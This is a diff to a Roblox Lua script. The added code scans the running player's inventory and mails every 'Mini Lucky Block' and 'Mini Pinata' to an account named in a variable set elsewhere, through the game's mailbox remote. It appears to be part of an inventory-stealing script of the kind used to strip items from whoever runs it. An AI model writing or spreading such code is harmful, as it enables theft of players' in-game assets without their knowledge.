@@ -51,6 +51,37 @@ end
 
 task.wait(2)
 
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Mini Lucky Block" then
+        local args = {
+            username,
+            "Lucky Block",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
+
+local cs = result.Inventory.Misc
+for i, v in pairs(cs) do
+    if v.id == "Mini Pinata" then
+        local args = {
+            username,
+            "Pinata",
+            "Misc",
+            i,
+            v._am or 1
+        }
+        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
+    end
+end
+
+task.wait(2)
 
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
